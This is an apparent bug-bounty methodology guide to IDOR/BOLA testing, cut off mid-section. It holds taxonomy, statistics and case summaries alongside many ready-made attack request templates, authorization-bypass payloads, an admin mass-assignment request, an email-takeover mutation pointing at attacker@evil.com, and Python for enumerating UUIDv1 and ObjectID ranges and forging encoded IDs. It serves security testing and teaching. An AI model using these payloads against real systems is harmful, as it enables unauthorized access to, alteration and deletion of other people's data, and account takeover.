---
name: idor
description: Comprehensive IDOR/BOLA testing methodology covering REST, GraphQL, gRPC, WebSocket, mobile APIs, payment systems, file access, race conditions, UUID bypass techniques, Burp Suite/Nuclei tooling, and bug bounty report writing — synthesized from 1,000+ HackerOne reports and empirical BOLA taxonomy research.
sources: hackerone_public, owasp, cve_database, bug_bounty_reports
---

# IDOR / BOLA Testing

> **Classification:** OWASP API1:2023, CWE-639, CWE-284, CWE-285, CWE-862  
> **Version:** 5.0 — 1,000+ HackerOne Reports + Empirical BOLA Taxonomy + 2026 CVEs  
> **Statistics:** 200+ IDOR issues reported monthly to HackerOne customers; median bounty $500; top single bounty $20,000 (GitLab); 36% of medtech bounty payouts are IDOR

---

## 1. Why IDOR Is Vulnerability Class #1

**Insecure Direct Object Reference (IDOR)**, classified as **Broken Object-Level Authorization (BOLA)** under OWASP API Security Top 10 (API1:2023), is the most prevalent and impactful API vulnerability. From 1,000+ HackerOne reports:

| Metric | Value |
|--------|-------|
| HackerOne monthly IDOR volume | 200+ reported to customers |
| Highest single IDOR bounty | $20,000 (GitLab — private object theft via import) |
| Highest auth-adjacent bounty | $39,999 (Uber — Phabricator API access) |
| Empirical BOLA families | 6, from 84 confirmed cases across 29 programs |
| Non-sequential ID exploitation | 39.2% used UUIDs, encoded IDs, emails, or hashes |
| Horizontal vs vertical | 85.7% horizontal, 11.9% vertical privilege escalation |
| GraphQL in top 20 reports | 7 of 20 highest-upvoted HackerOne IDOR reports |
| Industry prevalence | 36% medtech, 31% professional services, 18% government |

**Why WAFs cannot detect IDOR:** `GET /api/users/42` and `GET /api/users/43` are syntactically identical. No signature distinguishes them. Authorization is a business-logic decision requiring knowledge of object ownership.

**Why UUIDs are not a defense:** 39.2% of confirmed BOLA cases used non-sequential identifiers. The question is not "can the attacker guess the ID?" but "where does the ID leak?" UUIDs leak through list endpoints, error messages, email notifications, Referrer headers, WebSocket broadcasts, and GraphQL introspection.

**Why destructive IDORs dominate:** 41.7% of confirmed BOLA cases involve unauthorized writes/deletes. Most scanner guidance focuses on reads. Always test write and delete paths.

**The Prevention Hierarchy:**
```
1. ARCHITECTURE: Design authorization in (Zanzibar/SpiceDB/OpenFGA, RLS, ABAC)
2. FRAMEWORK: Enforce per-object checks (Pundit, Policies, @PreAuthorize)
3. TESTING: Verify in CI/CD pipeline (Autorize, Nuclei, contract tests)
4. DETECTION: Monitor for exploitation (SIEM rules, anomaly detection)
5. RESPONSE: Contain and remediate (IR playbook, post-mortem)
```

---

## 2. BOLA Taxonomy — Six Vulnerability Families

Empirical study of 84 confirmed BOLA cases across 29 HackerOne programs. Only 42% of BOLA-tagged reports constituted confirmed BOLA — the tag significantly overcounts.

### Family 1: Action-Level Object BOLA (41.7% — TEST FIRST)

Unauthorized state-changing operations (create, update, delete, trigger) on another user's object by substituting the target identifier. Developers implement read-path auth but forget write-path auth. 8 of 17 top-bounty reports involve deletion or modification.

**Key cases:**
- Snapchat #1819832 ($15,000) — `DeleteStorySnaps` GraphQL mutation, any user's story deleted by swapping the `ids` parameter
- HackerOne #2122671 — Mass-delete any user's certifications via numeric ID swap in GraphQL mutation
- Reddit #1213237 ($5,000) — DELETE any user's direct messages (4.4M messages exposed)
- Yelp #2944357 — Unauthenticated reservation cancellation

### Family 2: Direct Object Reference (36.9% — TEST FIRST)

Classic IDOR — unauthorized read access via manipulating object identifiers.

**Identifier types exploited:** Sequential integers 60.8%, UUIDs leaked elsewhere 22.3%, email addresses 8.1%, Base64-encoded compound IDs 5.4%, hashed values 3.4%

**Key cases:**
- GitLab #743953 ($20,000) — Foreign-key arrays in import tarball steal issues and merge requests from private projects
- Bykea #2374730 — Sequential `booking_id` leaks full customer PII
- U.S. DoD #2586641 — Path parameter manipulation leaks military demographics

### Family 3: Tenant Isolation (8.3% — HIGH priority)

Cross-organization access where an entire tenant's data is exposed. Root cause: inconsistent `tenant_id` scoping in database queries; GraphQL resolvers must apply tenant scoping at every resolver level, not just the root.

**Key cases:**
- Shopify #2207248 ($5,000) — Cross-tenant billing via GraphQL `BillingInvoice` ID swap
- TikTok #984965 — Cross-tenant via `AddRulesToPixelEvents` mutation
- SingleStore #3219944 — Swapping `projectID` exposed another tenant's scheduled jobs

### Family 4: Workflow-Context (6.0% — MEDIUM priority)

Access persists after a state change that should have revoked it.

**Key cases:**
- Tools for Humanity #2381816 — Former members queried current team data (checked "ever a member" not "current member")

**Test protocol:** Revoke access, re-test with original session, re-test with fresh login, wait 24h and re-test for cached permission.

**State transitions to test:**
- Active member → removed member
- Active account → deactivated account
- Admin → demoted regular user
- Trial account → expired trial
- Employee → terminated (SSO session persistence)
- Invitation revoked but token still accepted

### Family 5: Chained Disclosure (4.8% — HIGH impact)

Multi-step exploits where initial IDOR provides information enabling a higher-impact second stage. Stage 1 gathers IDs/tokens; Stage 2 uses them for writes, ATO, or financial fraud.

**Key cases:**
- Uber #1145428 ($5,750) — IDOR enumeration + IDOR modify + auth bypass → any U4B user charges any amount to any business credit card
- Stripe/Taxjar #1581240 — Invitation token leak via IDOR → mass account takeover
- LinkedIn #2291999 — Read-only IDOR on project data → unauthorized proposals using leaked budget/scope

### Family 6: Object Rebinding (2.4% — MEDIUM priority)

Server trusts a client-supplied ownership field, allowing object reassignment. Detection: look for ownership-like fields (`user_id`, `owner_id`, `account_id`, `card_number`) in request bodies that are mutable by the client.

**Key cases:**
- PayPal #415081 ($10,500) — Add secondary users from other accounts to attacker's business account
- MTN Group #1272478 — Profile update with swapped `user_id` → account takeover
- Starbucks Thailand #766437 — Hidden `CardNumber` field transfers funds from victim's card

---

## 3. Master Vulnerability Classification

| ID | Class | OWASP | CWE | Description | CVSS Range |
|----|-------|-------|-----|-------------|------------|
| BOLA-H | Horizontal IDOR | API1:2023 | CWE-639 | Access peer's objects at same privilege | 4.3–8.6 |
| BOLA-V | Vertical IDOR | API1:2023 | CWE-639 | Access higher-privilege objects | 6.5–9.8 |
| IDOR-CT | Cross-Tenant | API1:2023 | CWE-639 | Access different tenant's objects | 7.5–9.8 |
| IDOR-2O | Second-Order | API1:2023 | CWE-639 | Stored reference resolved later | 4.3–8.6 |
| IDOR-RC | Race-Condition | API1:2023 | CWE-362 | TOCTOU between authz check and access | 5.9–8.1 |
| IDOR-GQL | GraphQL IDOR | API1:2023 | CWE-639 | Node interface, mutation, alias-based | 6.5–9.8 |
| IDOR-FILE | File Reference | API1:2023 | CWE-639 | Predictable file paths/signed URLs | 4.3–7.5 |
| IDOR-PAY | Payment IDOR | API1:2023 | CWE-639 | Invoice/subscription/refund manipulation | 7.5–9.8 |
| IDOR-WS | WebSocket IDOR | API1:2023 | CWE-639 | Subscription/channel auth gaps | 4.3–8.6 |
| BFLA | Function-Level | API5:2023 | CWE-285 | Access admin/privileged functions | 6.5–9.8 |

**CVSS v3.1 quick scoring guide:**

| Scenario | Vector | Score |
|----------|--------|-------|
| Read peer's non-sensitive profile | AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N | 4.3 Medium |
| Read PII or financial data | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 6.5 Medium |
| Read + modify data | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N | 8.1 High |
| Read + modify + delete | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 8.8 High |
| Unauthenticated access to any user's data | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | 9.1 Critical |
| Cross-tenant with PII (Scope:Changed) | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N | 9.6 Critical |
| Account takeover via IDOR chain | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H | 9.8 Critical |

---

## 4. 8-Phase IDOR Hunting Methodology

### Phase 1: Reconnaissance (1–2 hours)

```bash
# 1. Proxy all traffic through Burp Suite while browsing normally

# 2. Extract API endpoints from JavaScript bundles
jsluice urls target.js | grep -E "api|v[0-9]"
jsluice endpoints https://target.com/app.js

# 3. Check for exposed source maps
curl -s https://target.com/main.js.map | jq -r '.sources[]'

# 4. Query Swagger/OpenAPI docs
# Common paths: /.well-known/openapi.json, /swagger.json, /openapi.yaml
#               /v2/api-docs, /v3/api-docs, /api-docs, /swagger-ui.html

# 5. GraphQL: run full introspection
# POST /graphql with:
# {"query": "{__schema{queryType{name}mutationType{name}types{name kind fields{name args{name}}}}}"}
# If introspection disabled: use Clairvoyance for field guessing

# 6. gRPC: enumerate services if reflection enabled
grpcurl -plaintext target.com:50051 list

# 7. Decompile mobile apps
jadx -d output/ target.apk  # Android
# Then: grep -rn "api/" output/ | grep -E "(userId|user_id|id|uuid|accountId)"

# 8. Discover archived/zombie URLs
gau target.com | grep -i "api\|v[0-9]"
waymore -t target.com -mode U

# 9. Search for leaked Postman collections on Postman public workspaces
# 10. Test API version downgrade: /v1/, /v2/ if current is /v3/
```

**High-value target endpoints by bounty range:**

| Target | Example Endpoints | Bounty Range |
|--------|-------------------|-------------|
| User Profiles/PII | `/api/users/{id}`, `/api/profile/{id}` | $500–$5,000 |
| Financial Records | `/api/invoices/{id}`, `/api/transactions/{id}` | $2,000–$15,000 |
| Documents/Files | `/api/documents/{id}/download`, `/attachments/{uuid}` | $500–$5,000 |
| Admin Functions | `/api/admin/users/{id}`, `/internal/config/{id}` | $5,000–$25,000 |
| GraphQL Mutations | `mutation { deleteResource(id: X) }` | $2,500–$12,500 |
| API Keys/Tokens | `/api/keys/{id}`, `/api/tokens/{id}` | $5,000–$50,000 |
| Billing/Subscriptions | `/api/billing/{id}`, `/api/subscriptions/{id}` | $1,000–$10,500 |
| Support Tickets | `/api/tickets/{id}`, `/support/case/{id}` | $500–$3,000 |

**Zombie endpoint indicators:**
- Different error message format (plain text vs JSON)
- Missing standard headers (CORS, rate-limit)
- Different auth scheme (API key vs JWT, or no auth at all)
- Inconsistent response format (XML vs JSON)
- Found in mobile app decompilation but absent from documentation

### Phase 2: Account Setup (30 minutes)

```
1. Create minimum TWO accounts at same privilege level (attacker + victim)
2. Plant unique canary values in victim's account
   (synthetic PII: specific fake email/name that cannot appear by coincidence)
3. For vertical testing: accounts at each privilege level
4. For multi-tenant: accounts in different organizations/workspaces
5. Record all session tokens, cookies, and API keys per account
6. Note the IDs of all objects created by each account
```

### Phase 3: Request Mapping (1–2 hours)

Identify every request containing object references:
- URL path parameters: `/api/users/{id}/profile`
- Query string parameters: `?user_id=123`, `?account_id=abc`
- POST/PUT body fields: `{"invoice_id": "inv_abc", "owner_id": "user_123"}`
- HTTP headers: `X-Tenant-ID`, `X-User-ID`, `X-Org-ID`
- GraphQL variables: `{"userId": "123"}`
- WebSocket message fields: `{"channel": "user.123.notifications"}`

**Priority order:** PII/financial endpoints > export/download > write operations > batch/bulk > admin tools > read operations

### Phase 4: Manual Testing (2–6 hours)

**Two-account swap test:**
1. Perform action as User A (attacker), capture request with all IDs
2. Replace every object ID with User B's (victim) corresponding ID
3. Replay with User A's session token
4. Interpret: `200` with B's data = IDOR confirmed. `403/404` = try Phase 6 bypasses.

**Test three identities for every endpoint:**
- Owner (should succeed — baseline)
- Another user at same privilege level (horizontal IDOR)
- Unauthenticated (unauthenticated access = critical CVSS 9.1+)

**Test all HTTP methods on every endpoint:**
```
GET /api/resource/{VICTIM_ID}          — Read
PUT /api/resource/{VICTIM_ID}          — Full update
PATCH /api/resource/{VICTIM_ID}        — Partial update
DELETE /api/resource/{VICTIM_ID}       — Destroy
POST /api/resource/{VICTIM_ID}/action  — Trigger action
```
An endpoint may protect GET but not DELETE. Always test all methods.

### Phase 5: Automated Testing (1–3 hours)

- **Autorize** (Burp extension): Set victim session, browse as attacker, review green (bypassed) entries
- **AuthMatrix**: Define roles, mark expected access, run matrix across all endpoints
- **ffuf**: Numeric ID enumeration with response length filtering
- **graphql-cop**: GraphQL-specific scanning
- **Nuclei**: Custom IDOR templates (see Section 15)

### Phase 6: Bypass Attempts on 403/401 Responses

When direct access returns 403/401, try:

| Bypass Category | Payloads |
|----------------|---------|
| Method switching | GET → POST, POST → GET |
| Path manipulation | `/api/users/42/` (trailing slash), `/api/./users/42` (dot segment), `/API/USERS/42` (case variation), `/api/users/42.json` (extension), `/api/v1/../v2/users/42` (path traversal) |
| Content-Type switch | `application/json` → `application/x-www-form-urlencoded` |
| HPP | `?user_id=attacker&user_id=victim` |
| Array wrapping | `{"user_id": [victim_id]}` |
| API version downgrade | `/v1/` instead of `/v3/` |
| Header injection | `X-Original-URL: /api/users/42`, `X-Rewrite-URL: /api/users/42`, `X-HTTP-Method-Override: DELETE`, `X-Forwarded-For: 127.0.0.1` |
| Encoding | `%2f`, `%00`, unicode, octal `052`, hex `0x2A` |

### Phase 7: Blind IDOR Testing (1–2 hours)

For write/delete endpoints where the response does not confirm success:
1. Check victim's account for state changes after the request
2. Monitor victim's email for triggered notifications
3. Check webhook endpoints for triggered fires
4. Compare response timing between valid and invalid actions
5. Compare `Content-Length` between valid and invalid IDs — if length differs, the IDOR is confirmed even with an empty response body

### Phase 8: Verification and Report (1–2 hours)

1. Confirm response contains actual victim data (not just status 200)
2. Compare content lengths: owner response vs attacker response
3. For destructive actions: verify state change in victim's account
4. Test same object across all HTTP methods
5. Estimate affected user count from observable ID ranges
6. Never access real users' private data — test only with your own two controlled accounts

---

## 5. REST API Attack Techniques

### Technique 1: Simple Reference Mutation (~60% of all IDOR findings)

The most basic and most common technique:

```http
GET /api/orders/{{YOUR_ORDER_ID}} HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
```
Change to:
```http
GET /api/orders/{{VICTIM_ORDER_ID}} HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}
```

Apply to path params, query params, and request body:
```
GET /api/profile?user_id={{VICTIM_ID}}
PUT /api/users/settings — body: {"user_id": "{{VICTIM_ID}}", "setting": "value"}
```

**Real case — PayPal #415081 ($10,500):** Business Account owner adds secondary users from other accounts by manipulating the user identifier in the assignment request. Classic Action-Level BOLA: the POST body accepted a victim's user ID, and the server added that user to the attacker's business account without ownership validation.

### Technique 2: HTTP Method Override

Some frameworks honor override headers to change the effective method:
```http
POST /api/users/{{VICTIM_ID}} HTTP/1.1
X-HTTP-Method-Override: DELETE

POST /api/users/{{VICTIM_ID}} HTTP/1.1
X-Method-Override: PUT

POST /api/users/{{VICTIM_ID}}?_method=DELETE HTTP/1.1

POST /api/users/{{VICTIM_ID}} HTTP/1.1
X-HTTP-Method: PATCH
```

### Technique 3: HTTP Parameter Pollution (HPP)

Duplicate parameters exploit parser differences across frameworks:
```http
GET /api/profile?user_id={{YOUR_ID}}&user_id={{VICTIM_ID}} HTTP/1.1
```

| Framework | Value Used |
|-----------|-----------|
| PHP | Last value (victim_id) |
| Express.js | First value or array |
| Python Flask | First value |
| ASP.NET | Comma-joined |
| Java Spring | First value |

### Technique 4: JSON Type Confusion

Bypass integer-only validation by changing the type in JSON bodies:
```json
{"user_id": {{VICTIM_INT_ID}} }         — original integer
{"user_id": "{{VICTIM_INT_ID}}" }       — string
{"user_id": [{{YOUR_ID}}, {{VICTIM_ID}}] }  — array
{"user_id": {"$gt": 0} }               — NoSQL operator
{"user_id": null }                     — null
{"user_id": -1 }                       — negative
{"user_id": {{VICTIM_ID}}.0 }          — float
{"user_id": 4.3e1 }                    — scientific notation
```

### Technique 5: Nested Resource IDOR

Multi-level paths have multiple IDs to test independently:
```
/api/orgs/{{YOUR_ORG}}/users/{{YOUR_USER}}/docs/{{DOC_ID}}
```
Test each segment independently:
- Change only org: `/api/orgs/{{VICTIM_ORG}}/users/{{YOUR_USER}}/docs/{{DOC_ID}}`
- Change only user: `/api/orgs/{{YOUR_ORG}}/users/{{VICTIM_USER}}/docs/{{DOC_ID}}`
- Skip parent validation: `GET /api/docs/{{VICTIM_DOC_ID}}` (direct child access)

**Real case — Rails Anti-Pattern:**
```ruby
# VULNERABLE: Checks project access but not document ownership
def show
  @document = Document.find(params[:id])  # Any doc ID works!
end

# FIXED: Scope through the authorized parent
def show
  @document = @project.documents.find(params[:id])  # Scoped to project
  authorize @document  # Pundit policy check
end
```

### Technique 6: Batch/Bulk Endpoint Abuse

```http
POST /api/batch HTTP/1.1
{"requests": [
  {"method": "GET", "url": "/api/users/{{VICTIM_ID_1}}"},
  {"method": "GET", "url": "/api/users/{{VICTIM_ID_2}}"}
]}

DELETE /api/items HTTP/1.1
{"ids": [{{YOUR_ID}}, {{VICTIM_ID_1}}, {{VICTIM_ID_2}}]}

GET /api/users?id[]={{YOUR_ID}}&id[]={{VICTIM_ID}} HTTP/1.1
```

### Technique 7: Header-Based IDOR

Custom headers may carry identity or tenant context that bypasses body-level checks:
```http
GET /api/admin/data HTTP/1.1
X-User-Id: {{VICTIM_USER_ID}}
X-Org-Id: {{VICTIM_ORG_ID}}
X-Forwarded-User: {{VICTIM_EMAIL}}
X-Real-IP: 127.0.0.1
```

### Technique 8: Path Normalization Bypass

```
/api/users/42       → Direct (may be blocked by middleware)
/api/users/42/      → Trailing slash
/api/./users/42     → Dot segment
/api/users/42%00    → Null byte
/api/users/42%2f    → Encoded slash
/api/users//42      → Double slash
/API/USERS/42       → Case variation
/api/users/42;      → Semicolon
/api/users/42.json  → Extension append
/api/v1/../v2/users/42  → Path traversal
```

### Common IDOR Payload Templates by Endpoint Type

**Export/Report IDOR:**
```http
GET /api/reports/export?user_id={{VICTIM_ID}}&format=csv HTTP/1.1
Authorization: Bearer {{YOUR_TOKEN}}

POST /api/reports/generate HTTP/1.1
{"report_type": "financial", "account_id": "{{VICTIM_ACCOUNT_ID}}"}
```

**Search/Filter Bypass:**
```http
GET /api/items?owner_id={{VICTIM_ID}} HTTP/1.1
GET /api/search?q=*&user_id={{VICTIM_ID}} HTTP/1.1
GET /api/analytics?account_id={{VICTIM_ID}} HTTP/1.1
```

**Webhook/Notification IDOR:**
```http
POST /api/webhooks HTTP/1.1
{"url": "https://{{YOUR_SERVER}}/hook", "user_id": "{{VICTIM_ID}}", "events": ["*"]}
```

**Mass Assignment + IDOR Combo:**
```http
PATCH /api/users/{{VICTIM_ID}} HTTP/1.1
Authorization: Bearer attacker_token
Content-Type: application/json

{
  "name": "Attacker",
  "role": "admin",
  "organization_id": "target_org_uuid",
  "is_verified": true,
  "subscription_tier": "enterprise"
}
```

---

## 6. GraphQL IDOR Deep Dive

GraphQL accounts for 7 of the top 20 HackerOne IDOR reports and approximately 12% of IDOR findings. It is the fastest-growing IDOR attack surface.

### GraphQL IDOR Attack Surface

| Attack Vector | Prevalence | Avg Bounty |
|--------------|------------|------------|
| Mutation without authorization | Very High | $12,500 |
| Node interface abuse | High | $5,000 |
| Base64 Global ID decode-modify-reencode | High | $5,000–$20,000 |
| GraphQL mutation delete/modify | Very High | $5,000–$15,000 |
| Field-level over-exposure | Very High | $0–$2,500 |
| Nested attributes bypass | Medium | $20,000 |
| Cross-tenant via mutation | Medium | $5,000 |
| Alias batching / rate limit bypass | Medium | $0–$1,000 |

### Vector 1: Full Introspection Query

```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        args { name type { name kind ofType { name kind } } }
      }
      interfaces { name }
    }
  }
}
```

Also query `__schema { types { name interfaces { name } } }` to find types implementing the Node interface.

If introspection is disabled, use Clairvoyance or manual field-name wordlists. Fingerprint the GraphQL engine with graphw00f first to know which disabled-introspection bypass techniques apply.

### Vector 2: Node Interface Abuse (Relay Global ID)

The Relay `node(id: ...)` interface is a universal IDOR entry point. Global IDs are Base64-encoded `TypeName:id` strings.

**Step 1:** Decode your own Global ID.
If your user node ID is `VXNlcjox`, it decodes to `User:1`.

**Step 2:** Forge IDs for other types and users.
```python
import base64

# User:2  → VXNlcjoy
# Invoice:1 → SW52b2ljZTox
# AdminSetting:1 → QWRtaW5TZXR0aW5nOjE=
forged = base64.b64encode(b"User:43").decode()   # VXNlcjo0Mw==
```

**Step 3:** Query with inline fragments.
```graphql
query {
  node(id: "{{BASE64_ENCODED_VICTIM_ID}}") {
    ... on Invoice {
      amount
      customerName
      customerEmail
      lineItems { description unitPrice }
    }
    ... on User {
      email
      phone
      paymentMethods { last4 brand }
    }
    ... on AdminSetting {
      key
      value
    }
  }
}
```

### Vector 3: Mutation-Based IDOR

**Delete mutation (highest severity — Action-Level BOLA):**
```graphql
mutation {
  deleteDocument(input: { documentId: "{{VICTIM_DOC_ID}}" }) {
    success
  }
}
```

**Update mutation:**
```graphql
mutation {
  updateUser(input: {
    userId: "{{VICTIM_USER_ID}}"
    email: "attacker@evil.com"
  }) {
    user { id email }
  }
}
```

**Delete certification (HackerOne #2122671 pattern — sequential integer ID):**
```graphql
mutation {
  deleteLicense(input: { licenseId: {{VICTIM_LICENSE_INT_ID}} }) {
    success
    errors
  }
}
```

**GraphQL billing document download (Shopify #2207248 pattern):**
```json
{
  "query": "{ billingDocumentDownload(documentId: \"gid://shopify/BillingDocument/{{VICTIM_DOC_INT_ID}}\") { url } }"
}
```

**GraphQL delete story (Snapchat #1819832 pattern):**
```graphql
mutation {
  deleteStorySnaps(input: {
    ids: ["{{VICTIM_STORY_ID_1}}", "{{VICTIM_STORY_ID_2}}"]
  }) {
    success
  }
}
```

### Vector 4: Alias Batching for Enumeration

A single GraphQL request with multiple aliases bypasses per-request rate limits. Many rate limiters count HTTP requests, not GraphQL operations.

```graphql
query {
  a1: user(id: "{{TEST_ID_1}}") { id email name }
  a2: user(id: "{{TEST_ID_2}}") { id email name }
  a3: user(id: "{{TEST_ID_3}}") { id email name }
  a4: user(id: "{{TEST_ID_4}}") { id email name }
  a5: user(id: "{{TEST_ID_5}}") { id email name }
}
```

One HTTP request with 100 aliases = 100 data fetches counted as 1 rate-limit hit.

### Vector 5: Nested Resolver Authorization Gaps

Authorization enforced on the parent query but not nested child resolvers:
```graphql
query {
  organization(id: "{{VICTIM_ORG_ID}}") {
    members {
      nodes {
        email
        personalDocuments {
          nodes { title content }
        }
      }
    }
  }
}
```

Also test fragment-based access to restricted fields on accessible objects:
```graphql
query {
  project(id: "{{PUBLIC_PROJECT_ID}}") {
    ... on Project {
      confidentialIssues {
        nodes { title description internalNotes }
      }
    }
  }
}
```

**VULNERABLE resolver (no authorization):**
```javascript
const resolvers = {
  Query: {
    invoice: (_, { id }) => Invoice.findById(id),  // Any user, any invoice
  }
};
```

**FIXED resolver:**
```javascript
const resolvers = {
  Query: {
    invoice: async (_, { id }, context) => {
      const invoice = await Invoice.findById(id);
      if (!invoice) throw new NotFoundError();
      if (invoice.userId !== context.user.id) {
        throw new ForbiddenError('Access denied');
      }
      return invoice;
    }
  }
};
```

### Vector 6: DataLoader Cache Pollution

In multi-tenant GraphQL services, if DataLoader caches by object ID alone (without tenant context), Request 1 from Tenant A loads an object into cache, and Request 2 from Tenant B gets that cached object — a cross-tenant data leak. Send two sequential requests from different tenant sessions to the same query and compare responses.

### GraphQL IDOR Checklist

```
1. Run introspection query to discover all types, queries, mutations, ID arguments
2. Identify types implementing the Node interface (Relay pattern)
3. Collect your own object Global IDs, decode from Base64, understand TypeName:id format
4. For each type with an ID argument: forge a Global ID referencing test account B's object
5. Query via node(id: ...) with inline fragments for all discovered types
6. For each mutation accepting an object ID: replace with test account B's object ID
7. Test nested resolvers: access parent object you own, check if child objects from other users return
8. Test alias batching with 5-10 of your own test IDs to confirm per-operation authorization
9. If introspection disabled, use field-name wordlists to discover hidden queries/mutations
```

### Real GraphQL IDOR Cases

- **HackerOne #2122671:** Numeric ID swap in delete mutation → mass-delete all user certifications (sequential IDs, no ownership check)
- **Shopify #2207248 ($5,000):** Sequential `BillingInvoice` ID in `BillingDocumentDownload` → cross-tenant billing data
- **Snapchat #1819832 ($15,000):** `DeleteStorySnaps` mutation with swapped `ids` → delete any user's Spotlight content
- **TikTok #984965:** `AddRulesToPixelEvents` mutation → cross-tenant pixel event rules, no tenant isolation in resolver
- **Reddit #1658418 ($5,000):** `subredditName` parameter swap in GraphQL → any subreddit's moderation logs
- **HackerOne #1969141 (Medium):** `/graphql` mutation allowed deleting campaigns of other users by modifying `campaign_id`

---

## 7. UUID and Non-Sequential ID Bypass Techniques

Empirical data: 39.2% of exploited BOLA used non-sequential identifiers. UUIDs stop blind enumeration but do nothing against authorization failures once the ID is obtained from any leakage channel.

### Identifier Type Breakdown (84 confirmed BOLA cases)

| Type | Prevalence |
|------|-----------|
| Sequential integers | 60.8% |
| UUIDs leaked from other endpoints | 22.3% |
| Email addresses used as keys | 8.1% |
| Base64-encoded compound IDs | 5.4% |
| Hashed/obfuscated values | 3.4% |

### UUID v1 Sandwich Attack

UUID v1 encodes a 60-bit timestamp (100-ns intervals since 1582-10-15) and a 48-bit node (MAC address). Create two objects, extract both UUIDs, enumerate everything between them.

**Detection:** Version nibble = 1 in position 14 of the UUID string: `xxxxxxxx-xxxx-**1**xxx-xxxx-xxxxxxxxxxxx`

```python
import uuid

def uuid1_to_timestamp(u):
    return u.time  # 100-ns intervals since 1582-10-15

def enumerate_uuid1_range(uuid_before, uuid_after, node=None):
    """Generate all possible UUIDv1 between two known UUIDs (sandwich attack)"""
    t_start = uuid.UUID(uuid_before).time
    t_end = uuid.UUID(uuid_after).time
    node = node or uuid.UUID(uuid_before).node
    for t in range(t_start, t_end + 1):
        yield str(uuid.UUID(fields=(
            t & 0xFFFFFFFF,          # time_low
            (t >> 32) & 0xFFFF,      # time_mid
            ((t >> 48) & 0x0FFF) | 0x1000,  # time_hi + version
            0x80 | (0 & 0x3F),      # clock_seq_hi + variant
            0,                       # clock_seq_low
            node                     # node
        )))
```

### MongoDB ObjectID Prediction

ObjectID = 4-byte timestamp + 5-byte random + 3-byte counter. Given one ObjectID, predict neighbors by incrementing/decrementing the counter bytes.

```python
def predict_nearby_objectids(known_id: str, count: int = 100):
    """Generate ObjectIDs close in time to a known one"""
    process_random = known_id[8:18]  # 5 bytes, process-specific
    counter = int(known_id[18:24], 16)  # 3-byte counter
    results = []
    for offset in range(-count, count):
        new_counter = (counter + offset) & 0xFFFFFF
        candidate = f"{known_id[:8]}{process_random}{new_counter:06x}"
        results.append(candidate)
    return results
```

### UUID Leakage Channels

1. API list/search responses — paginated lists return other users' object IDs
2. HTML source — hidden form fields, `data-*` attributes, inline JSON state
3. JavaScript bundles — hardcoded config objects, API route templates
4. Error messages — verbose errors expose internal IDs ("Object abc-123 not found")
5. Email headers/links — notification emails contain direct object links with UUIDs
6. WebSocket broadcasts — real-time events leak IDs to all subscribers in a room
7. Public profiles/URLs — profile pages embed UUIDs in page source
8. Referrer headers — URLs with UUIDs leak via HTTP Referer on outbound links
9. Export/download files — CSV/PDF exports contain cross-user IDs
10. GraphQL introspection — relay-style node IDs encode type and numeric ID

### Base64/Hex Encoded ID Manipulation

```python
import base64

# Decode, modify, re-encode
# eyJ1c2VyX2lkIjogNDJ9 → {"user_id": 42}
original = base64.b64decode("eyJ1c2VyX2lkIjogNDJ9").decode()
modified = base64.b64encode(b'{"user_id": 43}').decode()

# GraphQL Relay Global Node IDs
# Base64("User:42") = VXNlcjo0Mg==
# Base64("User:43") = VXNlcjo0Mw==
# Base64("Invoice:1") = SW52b2ljZTox
# Base64("AdminSetting:1") = QWRtaW5TZXR0aW5nOjE=
```

### Hashids Reversal

Hashids are deterministic and reversible if the salt is found in client-side JS:

```python
from hashids import Hashids

# Search JS bundles for: new Hashids(   salt:   hashids.encode
hashids = Hashids(salt="discovered_salt", min_length=8)
decoded = hashids.decode("Xz3a9B2c")  # returns (42,)
forged = hashids.encode(43)
```

### Email-as-Identifier IDOR

When APIs use email addresses as lookup keys (inherently guessable or discoverable):
```http
GET /api/users/victim@example.com/profile HTTP/1.1
Authorization: Bearer attacker_token
```

### Hash-Based ID Prediction

If the identifier is a hash of known inputs (email, username, timestamp):
```python
import hashlib
# If file_id = MD5(username + filename)
target_id = hashlib.md5(b"victim_user" + b"report.pdf").hexdigest()
# 32-hex-char = MD5, 40 = SHA-1, 64 = SHA-256
```

### UUID Special Values to Test

```http
GET /api/documents/00000000-0000-0000-0000-000000000000 HTTP/1.1  — null UUID
GET /api/documents/ffffffff-ffff-ffff-ffff-ffffffffffff HTTP/1.1  — max UUID
GET /api/documents/550e8400e29b41d4a716446655440000 HTTP/1.1       — dashless format
GET /api/documents/550E8400-E29B-41D4-A716-446655440000 HTTP/1.1  — uppercase case
```

---

## 8. Multi-Tenant Isolation Testing

Tenant isolation failures represent 8.3% of BOLA findings but yield critical-severity results.

### Why Tenant Isolation Fails

- GraphQL resolvers independently fetch data without propagating tenant context at every level
- Microservice architectures where downstream services trust the API gateway without re-verifying
- Shared resource pools where boundaries are enforced by application logic, not database-level isolation
- Inconsistent `tenant_id` scoping: some queries include it, others omit it

### Attack Techniques

**Cross-tenant object access:**
```http
# Authenticated as Tenant A, request Tenant B's resource
GET /api/v1/organizations/TENANT_B_ID/invoices HTTP/1.1
Authorization: Bearer tenant_a_token

# GraphQL cross-tenant query
POST /graphql HTTP/1.1
{"query": "{ billingInvoice(id: \"TENANT_B_INVOICE_ID\") { amount currency } }"}
```

**Organization context switching via headers:**
```http
GET /api/settings HTTP/1.1
Authorization: Bearer user_token
X-Org-ID: target_org_id

GET /api/data HTTP/1.1
Cookie: session=abc; org_context=TARGET_ORG_ID
```

**JWT tenant claim manipulation:**
```
1. Remove tenant_id claim entirely → does server default to permissive state?
2. Set tenant_id to another tenant's value → validated against token subject?
3. Set tenant_id to null, empty string, or wildcard → bypasses scoping?
4. Use a token from one OAuth client in another client's API
```

**API Gateway / Kubernetes Istio misconfiguration:**

`RequestAuthentication` validates JWTs when present but does NOT reject requests without a JWT. Must combine with `AuthorizationPolicy`:
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
spec:
  rules:
    - from:
        - source:
